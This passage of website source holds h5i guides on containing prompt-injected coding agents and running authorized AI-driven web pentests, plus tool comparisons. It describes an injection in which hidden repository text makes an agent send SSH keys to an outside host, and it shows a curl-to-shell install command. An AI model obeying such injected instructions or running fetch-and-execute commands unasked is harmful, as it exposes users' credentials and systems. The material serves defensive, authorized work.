    "title": "How to protect a coding agent from prompt injection | h5i", "h1": "How to protect a coding agent from prompt injection",
    "description": "Limit the files, credentials, network destinations, local services, and repository writes available to a prompt-injected coding agent.",
    "deck": "Assume a malicious instruction reaches the agent and the agent follows it. A sandbox cannot correct that decision, but it can restrict the files, credentials, services, and output the agent can reach.",
    "body": """
<div class="callout danger"><strong>Security assumption.</strong> The agent has accepted a malicious instruction and will use every available tool to follow it. Protection must come from controls the agent cannot change.</div>
<h2 id="attack">A prompt injection uses normal agent capabilities</h2>
<p>A repository tells the agent to read setup instructions before running tests. Those instructions include a hidden request: read the user's SSH directory and send its contents to a diagnostics host.</p>
<p>This attack needs no software exploit. Reading repository text, opening files, and making HTTP requests are normal coding-agent operations. The malicious text can also arrive through an issue, test output, generated documentation, or a web page.</p>
<h2 id="detection">Detection helps, but cannot enforce safety</h2>
<p>A text filter or second model may identify obvious malicious instructions. It may also miss a reworded instruction or block legitimate setup steps. Because the attacker controls the text, detection should reduce exposure but should not decide what the agent is allowed to access.</p>
<p>Assume detection fails. The remaining question is concrete: what files, credentials, destinations, local services, and repositories can the agent reach?</p>
<h2 id="controls">Restrict the capabilities an injected agent can use</h2>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Attempt</th><th>Required control</th><th>Remaining risk</th></tr></thead><tbody>
<tr><td>Read host secrets</td><td>Grant only required filesystem paths; use a separate agent home</td><td>Files placed inside the workspace remain readable</td></tr>
<tr><td>Steal an API key</td><td>Keep the real key outside the box and broker approved requests</td><td>An allowed request may still contain source code</td></tr>
<tr><td>Send data elsewhere</td><td>Allow only required network destinations at an enforced layer</td><td>Approved destinations remain reachable</td></tr>
<tr><td>Use SSH, Docker, or desktop authority</td><td>Deny host Unix sockets and isolate loopback</td><td>Every explicit socket grant carries real authority</td></tr>
<tr><td>Publish a harmful change</td><td>Require external review before export or apply</td><td>A reviewer can still approve bad code</td></tr>
</tbody></table></div>
<h2 id="files">Do not expose the developer's home directory</h2>
<p>An h5i box receives only the filesystem paths granted by its resolved policy. Its agent home is a per-box copy with credential-shaped entries removed. Paths such as <code>~/.ssh</code> and <code>~/.aws</code> should not be present unless the task explicitly requires them.</p>
<p>Workspace contents are intentionally readable. Do not copy a secret into the repository and expect the sandbox to hide it from the agent.</p>
<h2 id="credentials">Keep reusable credentials outside the box</h2>
<p>A secret in an environment variable or dotfile can be copied by any compromised process. h5i instead gives the box a per-run placeholder and sends approved requests through a host-side credential broker. The broker selects the upstream service and adds the real credential outside the box.</p>
<p>The broker prevents direct theft of the key; it does not narrow the service permissions attached to that key. Use service credentials with the minimum required scope. It also cannot stop source code from appearing in an allowed model request.</p>
<h2 id="network">Enforce network and local-service boundaries</h2>
<p>Proxy variables constrain only software that uses the proxy. If raw off-list connections must fail, use an isolation tier that enforces destinations at L3/L4, such as <code>supervised</code> or <code>microvm</code>. The container tier's HTTP proxy does not constrain a program that opens its own socket.</p>
<p>Unix sockets and loopback services need the same attention. An SSH agent or container daemon can give the box substantial host authority without any internet connection. Deny Unix sockets by default and grant only the specific local service a task needs.</p>
<h2 id="browser">Use a fresh browser profile inside the box</h2>
<p>A daily browser profile contains cookies, extensions, downloads, and authenticated sessions. Headless mode does not remove that authority. Place browser work inside the box with a fresh profile so page code cannot inherit the user's sessions and <code>localhost</code> refers to the box's dev server.</p>
<h2 id="output">Review the patch outside the sandbox</h2>
<p>Capability restrictions do not make the generated code safe. A prompt-injected agent can still write a backdoor or weaken a test inside its workspace. The box must not decide that its own result is acceptable.</p>
<p>Export the patch with its execution report and receipt. Review them before applying the change to the parent repository.</p>
<h2 id="limits">What remains possible</h2>
<ul><li>The agent can damage or delete its disposable workspace.</li><li>It can misuse any file, destination, socket, or credential explicitly granted by policy.</li><li>It can send source through an allowed model request.</li><li>It can produce convincing but unsafe code for a human to review.</li><li>A shared-kernel tier does not protect against a successful host-kernel exploit.</li></ul>
<p>Sandboxing reduces the authority available after prompt injection. It does not prevent the injection or verify the final code.</p>
<h2 id="check">Check the boundary before running the agent</h2>
<p>Inspect the resolved policy and answer five questions: Which host files are readable? Which reusable credentials enter the box? Which internet destinations and local sockets are reachable? Which browser profile is used? Can the box write directly to the parent repository?</p>
<p>Test harmless denials for paths and destinations that should be unavailable. A security boundary should fail because of an enforced rule, not because the agent was asked to behave.</p>
<h2 id="sources">Sources and further reading</h2>
<ul><li><a href="/guides/write-a-box-policy/">Write a box policy</a>, for filesystem, network, socket, and resource controls.</li><li><a href="/manual/#credentials">Credential handling</a> and <a href="/manual/#af_unix-sockets">Unix-socket policy</a>.</li><li><a href="/guides/watch-the-browser/">Run the browser beside the dev server inside a box</a>.</li></ul>""",
    "faq": [
        ("Does sandboxing prevent source code from reaching the model?", "No. A coding agent can include source in an allowed model request. Preventing that requires a self-hosted model or a policy with no model egress."),
        ("Are permission prompts still useful inside a box?", "They catch mistakes and are fine to keep, but they are not the security boundary. A prompt-injected agent can approve or bypass its own application-level permissions; the box policy sits outside it."),
    ],
    "next": ("/guides/write-a-box-policy/", "Build the boundary", "Write down what the agent may reach", "Create a fail-closed profile for filesystem, network, and resources."),
    "cta": ("Limit what the agent can reach", "A narrow box makes a successful injection much less consequential.", "/guides/write-a-box-policy/", "Write a policy"),
}


WEB_SECURITY_GUIDE = {
    "section": "guides", "slug": "authorized-web-security-testing", "eyebrow": "Guide 02 / Web security",
    "published": "2026-09-09",
    "time": "12 min", "tags": "Pentesting &middot; CTF &middot; Red team",
    "title": "AI web security testing with h5i | Authorized guide",
    "h1": "Run an authorized web security test with an AI agent",
    "description": "Use h5i for an authorized pentest, CTF, or red-team exercise: scope an agent's network access, capture HTTP traffic, map endpoints, replay requests, and preserve evidence.",
    "meta": "Run an authorized pentest, CTF, or red-team exercise with an AI agent: scope access, map endpoints, replay HTTP requests, and preserve evidence.",
    "deck": "An offensive-security agent needs room to investigate and a hard edge around the assignment. This workflow gives it both: one target-scoped session, a bounded discovery ledger, an HTTP workbench, and a record you can review.",
    "body": f"""
<div class="callout"><strong>Outcome.</strong> You will create a session for a system you own or are explicitly authorized to test, inventory its exposed endpoints, change and replay one captured request, compare the response, and close the session with its evidence intact.</div>
<figure class="feature-figure"><img src="/_static/browser-authority-threat-model.svg" alt="An authorized target is reached through a policy-controlled browser session while credentials, localhost services, and unrelated sites remain outside its authority"><figcaption>Scope should be executable, not a sentence in a prompt. The session policy decides which origins the browser can reach; the ledger records what it learned inside that boundary.</figcaption></figure>
<h2 id="before">Before you start: write down authorization</h2>
<p>Use this guide only for a CTF target, lab, bug-bounty asset, or application whose owner has authorized the test. Record the permitted hosts, accounts, techniques, request rate, and time window before running an agent. h5i can enforce destinations and bound a crawl, but it cannot decide whether you have permission.</p>
<p>This walkthrough uses <code>https://target.example</code> as a placeholder. Replace it only with an in-scope host. Start conservatively: a single origin, four requests per second, and no path wordlist until the target rules allow it.</p>
<h2 id="install">1. Install the HTTP and recon plugins</h2>
{terminal('host', '$ curl -fsSL https://h5i.dev/install.sh | sh -s -- --websec --recon\n$ h5i plugin list')}
<p><strong>Check:</strong> the list identifies <code>websec</code> as the HTTP workbench and <code>recon</code> as the endpoint ledger. They are optional plugins, so a default h5i install does not imply they are present.</p>
<h2 id="session">2. Open a captured, target-scoped session</h2>
{terminal('host', '$ h5i browser open https://target.example --capture --allow target.example\n$ h5i browser status')}
<p><code>--capture</code> keeps request and response bodies because replay needs the exact message. That store can contain credentials and personal data. Treat it as sensitive test evidence and do not export it casually.</p>
<p><strong>Check:</strong> status names the intended target and the request log. If the application legitimately uses another origin, add that origin explicitly after confirming it is in scope; do not replace the allowlist with unrestricted egress.</p>
<h2 id="observe">3. Observe before you enumerate</h2>
{terminal('host', '$ h5i browser snapshot\n$ h5i recon extract\n$ h5i recon known\n$ h5i recon endpoints --json')}
<p><code>extract</code> reads URLs already disclosed by pages and bundles. <code>known</code> checks conventional files such as <code>robots.txt</code>, <code>sitemap.xml</code>, and <code>security.txt</code>. Discovery and testing remain separate: a candidate endpoint is not called a vulnerability.</p>
<p><strong>Check:</strong> every observed endpoint names the message that supports it. A candidate is only a lead; <code>confirmed</code> means its answer differs from the calibrated missing-path response.</p>
<h2 id="crawl">4. Run bounded reconnaissance</h2>
{terminal('host', '$ h5i recon crawl --max-requests 200 --rate 4\n$ h5i recon triage --calibrate\n$ h5i recon endpoints --state confirmed --json')}
<p>The request ceiling and rate are part of the test, not tuning trivia. They prevent an autonomous crawler from silently turning a small assessment into a load event. h5i ships no payloads or wordlists; if the rules permit path discovery, you provide the reviewed input with <code>recon paths --wordlist</code>.</p>
<p><strong>Check:</strong> inspect <code>h5i recon jobs list</code> and the endpoint states. A refused row means policy declined the request; it does not mean the endpoint is absent or safe.</p>
<h2 id="replay">5. Inspect and replay one HTTP request</h2>
{terminal('host', '$ h5i websec requests\n$ h5i websec show req_42 --raw\n$ h5i websec replay req_42 --set query.id=456\n$ h5i websec diff res_42 res_43\n$ h5i websec match res_43 --status 200 --contains ok')}
<p>Choose a request permitted by the rules of engagement and change one field at a time. Replay travels through the same session policy and record as browsing; it is not a side channel around scope. The response diff is evidence of a difference, not proof of impact.</p>
<p><strong>Check:</strong> verify the replay appears in the session and that the destination did not change. Escalate only after a person confirms the observation and the next action remains authorized.</p>
<h2 id="audit">6. Audit, report, and stop</h2>
{terminal('host', '$ h5i browser audit\n$ h5i recon export --out endpoints.jsonl\n$ h5i browser close')}
<p>Keep three categories distinct in the report: observed HTTP facts, recon state, and the agent's interpretation. Include request identifiers so another reviewer can trace a claim back to a message. Redact captured secrets before sharing any artifact.</p>
<p><strong>Stopping point:</strong> the session is closed, no new requests can be issued under its identity, and its ending is recorded. Do not leave a captured authenticated session live after the authorization window ends.</p>
<h2 id="gotchas">What this workflow does not do</h2>
<ul><li>It does not grant authorization or infer scope from a URL.</li><li>It does not provide a vulnerability scanner, exploit library, payload generator, or built-in wordlist.</li><li>It does not make agent conclusions trustworthy. Message records support observations; severity and exploitability still require review.</li><li>It does not match every browser API. Run Chromium inside an h5i box when compatibility matters more than engine-level capture.</li></ul>
<h2 id="sources">Reference</h2>
<ul><li><a href="/manual/#h5i-websec">HTTP workbench commands</a></li><li><a href="/manual/#h5i-recon">Recon ledger and endpoint states</a></li><li><a href="/manual/#h5i-browser">Browser session policy and audit</a></li><li><a href="/blog/ai-pentesting-tools/">AI pentesting tools compared</a></li><li><a href="/blog/burp-suite-vs-h5i-for-ai-agents/">Burp Suite vs h5i for AI agents</a></li></ul>""",
    "faq": [
        ("Can I use h5i for CTFs?", "Yes, when the CTF rules permit automation. A target-scoped session, bounded crawl, endpoint ledger, and request replay fit web challenges particularly well."),
        ("Is h5i a vulnerability scanner?", "No. It records browsing, discovery, and HTTP experiments. It deliberately ships no scanner, exploit library, payload generator, or wordlist."),
        ("Can h5i enforce a pentest scope?", "It can enforce allowed network destinations and request budgets, but it cannot encode every rule of engagement or establish legal authorization."),
    ],
    "next": ("/blog/burp-suite-vs-h5i-for-ai-agents/", "Choose the workbench", "Burp Suite vs h5i for AI agents", "Compare a mature human-led proxy platform with an agent-native, policy-controlled session."),
    "cta": ("Test only what you are allowed to test", "Start with one origin, an explicit request budget, and a captured session you can audit.", "/manual/#h5i-websec", "Read the workbench reference"),
}


AI_PENTESTING_TOOLS = {
    "section": "blog", "slug": "ai-pentesting-tools", "eyebrow": "Buyer guide / Web security",
    "published": "2026-09-09", "time": "7 min", "tags": "AI pentesting &middot; DAST &middot; Agent security",
    "social_image": "https://h5i.dev/_static/ai-security-tools-map.svg",
    "social_alt": "Burp Suite and Caido sit toward human-led investigation, OWASP ZAP toward plan-driven scanning, and h5i toward agent-led investigation with a bounded session",
    "title": "AI pentesting tools compared: Burp, ZAP, Caido, h5i",
    "h1": "AI pentesting tools: Burp Suite, ZAP, Caido, or h5i?",
    "description": "Burp Suite, ZAP, Caido, and h5i compared for AI pentesting: AI-assisted manual testing, AI-authored scan automation, and agent-led investigation.",
    "meta": "Burp Suite, ZAP, Caido, and h5i compared for AI pentesting: AI-assisted manual testing, AI-authored scan automation, and agent-led investigation.",
    "deck": "The right tool depends on what you want to delegate: help with manual testing, repeatable vulnerability scans, or an investigation where the agent chooses what to try next.",
    "body": f"""
<p>AI agents have already demonstrated strong capabilities in web security testing. Research has shown that agents can find and exploit web vulnerabilities and carry out multistep attacks (<a href="https://arxiv.org/abs/2402.06664">website hacking study</a>).</p>
<p>Putting those capabilities to work means choosing the tools an agent will use. Should it operate Burp Suite, run ZAP scans, investigate traffic in Caido, or use a CLI-based tool like h5i?</p>
<p>The answer depends on what you want to delegate. This article compares the four tools through three practical uses.</p>
<h2 id="three-uses">What do you want AI to do?</h2>
<p>&ldquo;AI pentesting&rdquo; covers several kinds of work. Consider an application that lets users download invoices.</p>
<p>In <strong>AI-assisted manual testing</strong>, you inspect the download request and ask a model to explain its parameters or suggest tests. You decide which requests to send and check the results.</p>
<p>In <strong>AI-authored automation</strong>, you ask a model to prepare a scan configuration. You review it, then run the scanner. The scan follows the configured procedure.</p>
<p>In <strong>agent-led testing</strong>, the agent logs in, finds an invoice, changes its identifier, compares responses, and decides what to investigate next. It needs browser interaction, HTTP request control, and enough history to track its experiments.</p>
<p>These approaches can overlap. They are useful starting points for choosing a tool, rather than exclusive categories.</p>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Your main task</th><th>A useful starting point</th><th>Why</th></tr></thead><tbody>
<tr><td>Investigate a web application manually</td><td>Burp Suite</td><td>Integrated request testing tools and a large extension ecosystem</td></tr>
<tr><td>Run repeatable vulnerability scans in CI</td><td>OWASP ZAP</td><td>Open-source scanning with a YAML Automation Framework</td></tr>
<tr><td>Explore traffic and let an agent use a proxy workspace</td><td>Caido</td><td>Request search, replay, payload testing, and official agent skills</td></tr>
<tr><td>Let an agent browse and test through a CLI</td><td>h5i</td><td>Browser interaction and direct HTTP control in one session</td></tr>
</tbody></table></div>
<figure class="feature-figure"><img src="/_static/ai-security-tools-map.svg" alt="A map places Burp Suite and Caido near human-led interactive investigation, OWASP ZAP near plan-driven scanning, and h5i near agent-led interactive investigation"><figcaption>The same four tools placed by who drives the test and how. This describes workflow fit, not product quality, and each tool can reach neighboring ground through APIs, extensions, or surrounding automation.</figcaption></figure>
<h2 id="burp">Burp Suite: a comprehensive web testing toolkit</h2>
<p>Burp combines a proxy, browser, and tools for investigating captured traffic. You can send a request to Repeater to modify and resend it, or use Intruder to test payload variations. Burp Scanner is available in Professional and DAST. Extensions add further testing and integrations (<a href="https://portswigger.net/burp/documentation/desktop/tools">Burp tool documentation</a>).</p>
<p>For someone already working in Burp, AI can build on that familiar process: explain a response, suggest an experiment, or help automate a task. PortSwigger also documents AI features in Repeater. The details of an external agent's access depend on the integration you use.</p>
<p>Burp is a good starting point when you want a human to investigate findings with a broad set of tools close at hand. <a href="/blog/burp-suite-vs-h5i-for-ai-agents/">Read the detailed Burp Suite vs h5i comparison.</a></p>
<h2 id="zap">OWASP ZAP: repeatable scanning and CI automation</h2>
<p>ZAP's Automation Framework lets you describe a scan in YAML, including authentication, crawling, passive and active scanning, reports, and exit behavior. An AI model can help prepare that configuration, while ZAP executes the jobs (<a href="https://www.zaproxy.org/docs/automate/automation-framework/">ZAP Automation Framework</a>).</p>
<p>This fits a recurring task such as scanning a staging application after deployment. You can review the configuration, keep it in version control, and reuse it across runs.</p>
<p>An agent can also use ZAP during an investigation. Its particular appeal here is that you can get automated vulnerability checks without making every testing decision depend on a live conversation with a model. <a href="/blog/owasp-zap-vs-h5i-for-ai-agents/">Read the detailed OWASP ZAP vs h5i comparison.</a></p>
<h2 id="caido">Caido: a proxy workspace agents can use</h2>
<p>Caido provides traffic search with HTTPQL, individual request experiments with Replay, and payload testing with Automate. Its workflows support reusable processing. Official Caido Skills let coding agents interact with Caido through its APIs (<a href="https://docs.caido.io/app/tutorials/skills">Caido documentation</a>).</p>
<p>That makes Caido relevant to both manual and agent-assisted testing. You can investigate captured traffic yourself, then ask an agent to help with work in the same workspace.</p>
<p>Choose it when the proxy workflow suits you and you want an agent to use the requests and testing tools already available there. Check the installed skills and their permissions to understand what the agent can access. <a href="/blog/caido-vs-h5i-for-ai-agents/">Read the detailed Caido vs h5i comparison.</a></p>
<h2 id="h5i">h5i: browser interaction and HTTP testing from the terminal</h2>
<p>h5i is a headless browser controlled through a CLI. It combines page interaction with direct HTTP request inspection and manipulation, so an agent can browse an application, inspect the requests it generates, edit and replay them, and compare responses without a separate interception proxy (<a href="/manual/#h5i-websec">h5i HTTP workbench</a>).</p>
<p>For the invoice example, the agent can find the download link through the page, inspect its request, change the invoice identifier, and examine the result. Page navigation and request experiments belong to the same session.</p>
<p>h5i also supports destination restrictions, audit logs, and sandboxing for the browser or the surrounding workflow. Those controls matter when you want to limit an agent's access. It does not include a vulnerability scanner: the agent or tester interprets the responses and develops the tests.</p>
<p>Choose h5i when you want an agent to work through browser and HTTP operations from the terminal, and are comfortable letting that agent direct the investigation.</p>
<h2 id="combine">You can combine them</h2>
<p>You do not need to commit every stage of testing to one product. A ZAP scan might produce a finding that you investigate manually in Burp or Caido. An agent using h5i might identify a suspicious authorization flow that you reproduce in Repeater.</p>
<p>Before choosing, ask what you need most: scanner-generated findings, an interactive traffic workspace, or browser and HTTP tools for an agent. Then check how you will authenticate, retain requests and responses, and reproduce a finding.</p>
<p>For work on a real target, follow the engagement or bug bounty program's scope and automation rules. Tool settings can help enforce those limits, but no tool establishes authorization.</p>
<div class="callout"><strong>Scope of this comparison.</strong> This is a workflow and feature comparison, based on the linked documentation. It does not rank vulnerability detection rates or benchmark performance. Features and availability vary by version and edition.</div>
<h2 id="sources">Official sources</h2>
<ul><li><a href="https://portswigger.net/burp/documentation/desktop/tools">PortSwigger: Burp Suite tools</a></li><li><a href="https://www.zaproxy.org/docs/automate/automation-framework/">ZAP Automation Framework</a></li><li><a href="https://docs.caido.io/app/tutorials/skills">Caido Skills</a></li><li><a href="/manual/#h5i-websec">h5i HTTP workbench</a> and <a href="/manual/#h5i-recon">recon ledger</a></li></ul>""",
    "faq": [
        ("Which AI pentesting tool should I start with?", "Start from the task. Burp Suite suits manual investigation with a broad toolkit, ZAP suits repeatable scans described in YAML, Caido suits traffic exploration that an agent can join through its official skills, and h5i suits an agent that browses and tests HTTP from the terminal."),
        ("Can an agent drive the whole investigation?", "Yes, if it has browser interaction, control over HTTP requests, and enough history to compare its experiments. Caido offers that inside a proxy workspace through its skills, and h5i offers it as a CLI session. In both cases decide beforehand what the agent may reach."),
        ("Which tool should I use for automated vulnerability scanning?", "ZAP for an open-source scanner with CI automation, or Burp Scanner in Burp Suite Professional or DAST. h5i has no vulnerability scanner: the agent or tester interprets the responses."),
    ],
    "next": ("/guides/authorized-web-security-testing/", "Run a bounded test", "Authorized web security testing with h5i", "Turn target scope and request budgets into an auditable agent session."),
    "cta": ("Decide what you want to delegate", "Then select the scanner, workbench, or agent session that fits it.", "/guides/authorized-web-security-testing/", "Follow the authorized-testing guide"),
}


BURP_COMPARISON = {
    "section": "blog", "slug": "burp-suite-vs-h5i-for-ai-agents", "eyebrow": "Comparison / Web security",
    "published": "2026-09-09",
    "social_image": "https://h5i.dev/_static/burp-vs-h5i.svg",
    "social_alt": "Burp Suite provides a broad browser, proxy, scanner, and extension workbench; h5i supports an external AI agent driving a penetration test end to end",
    "time": "4 min", "tags": "Burp Suite &middot; AI agents &middot; Pentesting",
    "title": "Burp Suite vs h5i for AI agents",
    "h1": "Burp Suite vs h5i for AI agents",
    "description": "Burp Suite vs h5i for AI agents: compare HTTP capture, request editing, browser automation, and fully automated penetration testing with Burp AT or h5i.",
    "meta": "Burp Suite vs h5i for AI agents: compare HTTP capture, request editing, browser automation, and fully automated penetration testing with Burp AT or h5i.",
    "deck": "Both tools support AI-driven web testing. Burp Suite provides the deeper testing platform and its own agent; h5i is designed for fully automated penetration tests driven end to end by an external AI agent.",
    "body": f"""
<div class="callout"><strong>The short answer.</strong> Choose Burp Suite for a mature proxy workbench, Scanner, Intruder, extensions, and Burp's own agent. Choose h5i when the primary workflow is a fully automated penetration test in which an external AI agent drives the browser, inspects and modifies traffic, and decides what to test next.</div>
<figure class="feature-figure"><img src="/_static/burp-vs-h5i.svg" alt="Burp Suite provides a broad browser, proxy, scanner, and extension workbench, while h5i gives an AI agent browser and HTTP operations through a scoped session"><figcaption>Both support agent-driven testing. Burp provides the broader workbench; h5i gives an external agent a direct browser-and-HTTP loop for running the test end to end.</figcaption></figure>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Decision</th><th>Burp Suite</th><th>h5i</th></tr></thead><tbody>
<tr><td>Traffic capture</td><td>Intercepting proxy records traffic from browsers and other clients</td><td>The agent browser records its own requests and responses</td></tr>
<tr><td>Request modification</td><td>Repeater, Intruder, Scanner, extensions</td><td>Structured edits, replay, diff, match, and sequences</td></tr>
<tr><td>Browser use</td><td>Mainstream browser through the proxy; Burp AT can operate Burp tools</td><td>Open, snapshot, click, fill, and inspect traffic in the same session</td></tr>
<tr><td>Agent interface</td><td>Burp AT inside a Burp project</td><td>CLI or JSON RPC for an external coding agent</td></tr>
<tr><td>Additional safety</td><td>Project scope and Burp AT tool permissions</td><td>Origin policy and an optional sandbox for the agent process tree</td></tr>
</tbody></table></div>
<h2 id="burp">Burp provides the deeper testing platform</h2>
<p>Burp's proxy collects traffic from a full browser or another configured client. Repeater supports manual request experiments; Intruder automates payload variations; Scanner crawls and audits applications; Collaborator and extensions cover further testing workflows.</p>
<p>Burp AT, currently a public beta in Burp Suite Professional, gives an agent direct access to these tools and the open project's data. Burp applies project scope, lets users disable individual tools, and provides manual, smart, and autonomous approval modes. Choose Burp when testing depth, its graphical workbench, or its scanner matters.</p>
<h2 id="h5i">h5i gives an external agent the complete testing loop</h2>
<p>h5i's browser is directly controlled by the agent. The same session that opens, reads, clicks, and fills a page also records the HTTP messages. The agent can address a captured request by ID, edit a structured field, resend it, and compare the response:</p>
{terminal('browser and HTTP traffic in one session', '$ h5i browser open https://target.example --capture --allow target.example\n$ h5i browser snapshot\n$ h5i browser click @e3\n$ h5i browser requests\n$ h5i websec replay req_42 --set query.id=456\n$ h5i websec diff res_42 res_43')}
<p>This is h5i's main comparison with Burp: an external agent can conduct the penetration test end to end through a direct, machine-readable path from browser action to request inspection, modification, and the next decision. h5i has fewer testing features, no vulnerability scanner, and no equivalent to Burp's extension ecosystem.</p>
<h2 id="sandbox">Sandboxing is an optional safety measure</h2>
<p>For an autonomous red-team task, h5i can place the agent and browser in a box with restricted files, credentials, processes, and egress. This can limit the damage from a mistaken or prompt-injected agent. It is additional containment, not the reason h5i can capture or modify HTTP traffic; those features also work without a box.</p>
<h2 id="decision">Choose by the testing workflow</h2>
<ul><li><strong>Choose Burp Suite</strong> for the richer proxy workbench, Scanner, Intruder, Collaborator, extensions, or Burp AT.</li><li><strong>Choose h5i</strong> for a fully automated penetration test driven end to end by an external AI agent.</li><li><strong>Consider h5i's sandbox</strong> separately when that autonomous agent's host or network authority should be restricted.</li></ul>
<p>Neither tool establishes authorization. For pentesting, bug bounty, red teaming, or CTF automation, the target owner or competition rules define what is allowed. Network controls help enforce part of that scope; they do not replace it.</p>
<h2 id="sources">Product references</h2>
<ul><li><a href="https://portswigger.net/burp/documentation/desktop/burp-at">Burp AT</a> and its <a href="https://portswigger.net/burp/documentation/desktop/burp-at/tools">tools and permissions</a></li><li><a href="https://portswigger.net/burp/documentation/scanner">Burp Scanner</a></li><li><a href="/manual/#h5i-browser">h5i browser</a></li><li><a href="/manual/#h5i-websec">h5i HTTP workbench</a></li></ul>""",
    "faq": [
        ("Is h5i a replacement for Burp Suite?", "No. Burp Suite provides a much broader proxy, scanner, and extension platform. h5i is aimed at fully automated penetration tests driven through browser and HTTP operations by an external AI agent."),
        ("Can Burp Suite be used by AI agents?", "Yes. Burp AT is a native agent in Burp Suite Professional, with direct access to Burp tools, project scope, and configurable approvals."),
        ("Does h5i require a sandbox?", "No. Browser automation, traffic capture, and HTTP replay work without one. A box is an optional boundary for autonomous agent work."),
    ],
    "next": ("/guides/authorized-web-security-testing/", "Try the workflow", "Run an authorized web security test", "Create a scoped session, build an endpoint ledger, and replay one captured request."),
    "cta": ("Give the agent a narrow assignment", "Make target scope, request budget, captured evidence, and the stopping point part of the run.", "/guides/authorized-web-security-testing/", "Follow the security-testing guide"),
}


ZAP_COMPARISON = {
    "section": "blog", "slug": "owasp-zap-vs-h5i-for-ai-agents", "eyebrow": "Comparison / Web security",
    "published": "2026-09-09",
    "social_image": "https://h5i.dev/_static/zap-vs-h5i.svg",
    "social_alt": "OWASP ZAP automates spiders and vulnerability scans, while h5i supports an external AI agent driving browser and HTTP testing end to end",
    "time": "4 min", "tags": "OWASP ZAP &middot; AI agents &middot; DAST",
    "title": "OWASP ZAP vs h5i for AI agents",
    "h1": "OWASP ZAP vs h5i for AI agents",
    "description": "OWASP ZAP vs h5i for AI agents: compare DAST scanning and MCP automation with fully automated, agent-driven browser testing, HTTP capture, editing, and replay.",
    "meta": "OWASP ZAP vs h5i for AI agents: compare DAST scanning and MCP automation with fully automated, agent-driven browser testing, HTTP capture, editing, and replay.",
    "deck": "ZAP automates crawling and vulnerability scanning. h5i is designed for a fully automated penetration test in which an external AI agent explores the application and chooses each next experiment.",
    "body": f"""
<div class="callout"><strong>The short answer.</strong> Choose ZAP when the required result is crawl coverage, vulnerability alerts, or a repeatable DAST report. Choose h5i for a fully automated penetration test driven end to end by an external AI agent that browses, inspects traffic, changes requests, and chooses what to test next.</div>
<figure class="feature-figure"><img src="/_static/zap-vs-h5i.svg" alt="OWASP ZAP executes an Automation Framework plan through spiders and scanners, while an agent uses h5i to observe a page, send and record requests, and decide what to test next"><figcaption>The ZAP side shows its Automation Framework; ZAP can also be driven through its API or MCP add-on. h5i exposes browser and request operations instead of a scan engine.</figcaption></figure>
<div class="tbl-wrap"><table class="data"><thead><tr><th>Decision</th><th>OWASP ZAP</th><th>h5i</th></tr></thead><tbody>
<tr><td>Main result</td><td>Alerts, scan coverage, and reports</td><td>Browser state, captured messages, endpoint evidence, and an execution receipt</td></tr>
<tr><td>Automation</td><td>Automation Framework, API, CLI, Docker, MCP and LLM add-ons</td><td>CLI or JSON RPC called by an external agent</td></tr>
<tr><td>Discovery</td><td>Traditional, AJAX, and client spiders</td><td>Small bounded crawl and evidence-linked endpoint states</td></tr>
<tr><td>Security testing</td><td>Passive and active scanners</td><td>Replay and comparison; no vulnerability scanner</td></tr>
<tr><td>Additional safety</td><td>ZAP contexts and scan policies</td><td>Origin policy and an optional sandbox for the agent process tree</td></tr>
</tbody></table></div>
<h2 id="zap">ZAP is a scanner, including when AI drives it</h2>
<p>ZAP's Automation Framework can combine authentication, spiders, passive and active scans, API imports, tests, reports, and exit status in a YAML plan. It is suited to CI and repeatable DAST runs. Its MCP Integration add-on also lets an external AI client start spiders and scans or read alerts; the separate LLM Support add-on can invoke those MCP tools from ZAP itself.</p>
<p>The MCP add-on is currently alpha, and ZAP warns that its server grants broad control and must remain on localhost for trusted clients. The important point is that ZAP is not limited to fixed YAML plans and is not “non-agentic.”</p>
<h2 id="h5i">h5i lets the agent drive the entire investigation</h2>
<p>h5i lets an agent browse, capture a request, change structured fields, replay it, compare responses, and keep endpoint observations tied to messages. It does not generate vulnerability alerts or replace ZAP's scan rules.</p>
{terminal('agent-led browser and HTTP testing', '$ h5i browser open https://target.example --capture --allow target.example\n$ h5i browser snapshot\n$ h5i browser requests\n$ h5i websec replay req_42 --set query.id=456\n$ h5i websec diff res_42 res_43')}
<p>The difference is the unit of work. ZAP applies spider and scan rules and produces alerts. With h5i, the external agent drives the complete penetration-testing loop: observe the application, form a hypothesis, run an HTTP experiment, interpret the result, and choose the next action.</p>
<h2 id="sandbox">Sandboxing is optional</h2>
<p>For an autonomous red-team run, h5i can also place the agent and browser in a box with restricted host and network access. This limits possible damage if the agent makes a bad decision; it is not required for traffic capture, request modification, or replay.</p>
<h2 id="decision">Choose by the required result</h2>
<ul><li><strong>Choose ZAP</strong> for open-source DAST, spidering, automated alerts, or CI reports—even if an AI agent launches the work.</li><li><strong>Choose h5i</strong> for a fully automated penetration test whose direction is decided continuously by an external AI agent.</li><li><strong>Use both</strong> when ZAP supplies scan coverage and an h5i-driven agent investigates or reproduces selected findings.</li></ul>
<p>Only test systems you own or are authorized to assess. Neither a context definition nor an origin allowlist grants permission.</p>
<h2 id="sources">Product references</h2>
<ul><li><a href="https://www.zaproxy.org/docs/automate/automation-framework/">ZAP Automation Framework</a></li><li><a href="https://www.zaproxy.org/docs/desktop/addons/mcp-integration/">ZAP MCP Integration</a> and <a href="https://www.zaproxy.org/docs/desktop/addons/llm-support/mcp/">LLM MCP Support</a></li><li><a href="/manual/#h5i-browser">h5i browser</a></li><li><a href="/manual/#h5i-websec">h5i HTTP workbench</a></li></ul>""",
    "faq": [
        ("Is h5i an alternative to OWASP ZAP?", "Not for automated vulnerability scanning. h5i provides interactive browser automation, traffic capture, and HTTP replay; ZAP provides DAST alerts, spiders, and reports."),
        ("Can an AI agent use OWASP ZAP?", "Yes. ZAP has an API, Automation Framework, and an MCP Integration add-on; its LLM Support add-on can also invoke MCP tools."),
        ("Are both tools open source?", "Yes. The relevant choice is workflow: scanners and automation plans in ZAP, or interactive browser and HTTP operations in h5i."),
    ],
    "next": ("/blog/caido-vs-h5i-for-ai-agents/", "Compare another workbench", "Caido vs h5i for AI agents", "Compare a complete proxy workspace with an agent-driven browser and HTTP session."),
    "cta": ("Start with one scoped session", "Use a target you are authorized to test and make the request ceiling explicit.", "/guides/authorized-web-security-testing/", "Follow the testing guide"),
}


CAIDO_COMPARISON = {
    "section": "blog", "slug": "caido-vs-h5i-for-ai-agents", "eyebrow": "Comparison / Web security",
    "published": "2026-09-09",
